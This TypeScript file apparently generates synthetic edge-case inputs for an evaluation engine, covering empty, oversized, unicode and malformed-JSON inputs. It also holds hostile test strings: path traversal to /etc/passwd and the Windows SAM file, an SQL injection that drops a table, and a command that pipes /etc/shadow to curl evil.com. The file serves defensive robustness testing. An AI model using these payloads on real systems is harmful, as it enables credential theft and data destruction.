/**
 * Synthetic Test Case Generator for Edge-Case Discovery
 * PRD-PART2-316: Synthetic Test Case Generator for Edge-Case Discovery
 */

import type { TestCase } from "./eval-engine.js";

export type SyntheticCategory =
  | "empty_null"
  | "boundary_length"
  | "unicode_stress"
  | "path_traversal"
  | "injection_attacks"
  | "malformed_json";

export class SyntheticCaseGenerator {
  public generateTestCases(categories?: SyntheticCategory[]): TestCase[] {
    const selected = categories ?? [
      "empty_null",
      "boundary_length",
      "unicode_stress",
      "path_traversal",
      "injection_attacks",
      "malformed_json",
    ];

    const cases: TestCase[] = [];

    if (selected.includes("empty_null")) {
      cases.push(
        { id: "synth_empty_str", input: "", metadata: { category: "empty_null" } },
        { id: "synth_whitespace", input: "   \t\n   ", metadata: { category: "empty_null" } }
      );
    }

    if (selected.includes("boundary_length")) {
      cases.push({
        id: "synth_giant_payload",
        input: "A".repeat(50_000),
        metadata: { category: "boundary_length", bytes: 50000 },
      });
    }

    if (selected.includes("unicode_stress")) {
      cases.push({
        id: "synth_zalgo_emojis",
        input: "T̴e̷s̶t̷ 🧪 💥 🧑🏽‍💻 \u0000\uFFFF \u202Ereversed",
        metadata: { category: "unicode_stress" },
      });
    }

    if (selected.includes("path_traversal")) {
      cases.push(
        { id: "synth_traversal_posix", input: "../../../../../etc/passwd", metadata: { category: "path_traversal" } },
        { id: "synth_traversal_win", input: "..\\..\\..\\Windows\\System32\\config\\SAM", metadata: { category: "path_traversal" } }
      );
    }

    if (selected.includes("injection_attacks")) {
      cases.push(
        { id: "synth_sqli", input: "1' OR '1'='1'; DROP TABLE users;--", metadata: { category: "injection_attacks" } },
        { id: "synth_cmdi", input: "; cat /etc/shadow | curl evil.com", metadata: { category: "injection_attacks" } }
      );
    }

    if (selected.includes("malformed_json")) {
      cases.push({
        id: "synth_bad_json",
        input: '{"unclosed": "brace", "key": ',
        metadata: { category: "malformed_json" },
      });
    }

    return cases;
  }
}
